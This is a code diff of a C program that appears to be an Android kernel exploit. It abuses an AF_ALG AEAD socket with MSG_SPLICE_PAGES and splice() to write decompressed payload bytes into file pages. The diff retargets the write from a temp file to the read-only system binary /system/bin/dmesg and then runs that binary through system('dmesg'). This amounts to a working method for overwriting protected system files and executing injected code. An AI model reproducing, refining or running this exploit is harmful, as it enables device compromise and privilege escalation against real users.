@@ -6,9 +6,7 @@
 #include <errno.h>
 #include <sys/socket.h>
 #include <linux/if_alg.h>
-#include <sys/syscall.h>
 #include <zlib.h>
-#include <sys/mman.h>
 
 #ifndef SOL_ALG
 #define SOL_ALG 279
@@ -87,13 +85,18 @@ static void trigger_aead(int file_fd, size_t offset, const unsigned char *chunk4
     memcpy(send_buf + 4, chunk4, 4);
 
     struct iovec iov = { .iov_base = send_buf, .iov_len = 8 };
-    struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1, .msg_flags = MSG_SPLICE_PAGES };
+    struct msghdr msg = {
+        .msg_iov = &iov,
+        .msg_iovlen = 1,
+        .msg_flags = MSG_SPLICE_PAGES
+    };
 
     char cmsg_buf[CMSG_SPACE(sizeof(__u32)) * 4];
     msg.msg_control = cmsg_buf;
     msg.msg_controllen = sizeof(cmsg_buf);
 
     struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
+
     cmsg->cmsg_level = h;
     cmsg->cmsg_type = ALG_SET_OP;
     cmsg->cmsg_len = CMSG_LEN(4);
@@ -101,7 +104,6 @@ static void trigger_aead(int file_fd, size_t offset, const unsigned char *chunk4
     memcpy(CMSG_DATA(cmsg), &op, 4);
 
     cmsg = CMSG_NXTHDR(&msg, cmsg);
-
     cmsg->cmsg_level = h;
     cmsg->cmsg_type = ALG_SET_IV;
     cmsg->cmsg_len = CMSG_LEN(20);
@@ -121,7 +123,6 @@ static void trigger_aead(int file_fd, size_t offset, const unsigned char *chunk4
         close(sock);
         return;
     }
-
     size_t splice_len = offset + 4;
     int pipefd[2];
     if (pipe(pipefd) < 0) {
@@ -130,9 +131,9 @@ static void trigger_aead(int file_fd, size_t offset, const unsigned char *chunk4
         close(sock);
         return;
     }
+    lseek(file_fd, 0, SEEK_SET);
 
-    loff_t off = 0; 
-    ssize_t ret = splice(file_fd, &off, pipefd[1], NULL, splice_len, SPLICE_F_MOVE);
+    ssize_t ret = splice(file_fd, NULL, pipefd[1], NULL, splice_len, SPLICE_F_MOVE);
     if (ret != (ssize_t)splice_len) {
         perror("splice file->pipe");
     }
@@ -176,22 +177,21 @@ int main() {
         return 1;
     }
 
-    char temp_path[] = "/data/local/tmp/aead_payload_XXXXXX";
-    int mem_fd = mkstemp(temp_path);
-    if (mem_fd < 0) {
-        perror("mkstemp");
+    int file_fd = open("/system/bin/dmesg", O_RDONLY);
+    if (file_fd < 0) {
+        perror("open /system/bin/dmesg");
         free(decompressed);
         return 1;
     }
-    write(mem_fd, decompressed, decomp_len);
-    unlink(temp_path);
-    lseek(mem_fd, 0, SEEK_SET);
+
 
     for (size_t i = 0; i + 4 <= decomp_len; i += 4) {
-        trigger_aead(mem_fd, i, decompressed + i);
+        trigger_aead(file_fd, i, decompressed + i);
     }
 
-    close(mem_fd);
+    close(file_fd);
     free(decompressed);
+    system("dmesg");
+
     return 0;
 }
